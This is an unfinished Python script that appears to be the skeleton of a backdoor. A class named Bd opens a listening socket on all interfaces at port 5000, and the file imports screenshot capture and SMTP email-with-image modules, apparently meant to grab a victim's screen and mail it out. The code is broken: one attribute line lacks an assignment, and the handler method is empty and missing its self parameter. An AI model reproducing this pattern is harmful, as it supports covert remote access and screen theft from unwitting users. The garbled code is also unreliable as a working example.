#-*-coding: utf-8-*-
from socket import *
from pyautogui import screenshot
from smtplib import SMTP
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from threading import *


class Bd():
	def __init__(self):
		self.brk True
	def start(self, ip="0.0.0.0", port=5000, lstn=1):
		self.sock = socket()
		self.sock.bind((ip, port))
		self.sock.listen(lstn)
		self.conn, addr = self.sock.accept()
	def hear2someone():

if __name__ == '__main__':
	main = Bd()
	while main.brk:
		main.start()
		main.hear2someone()
	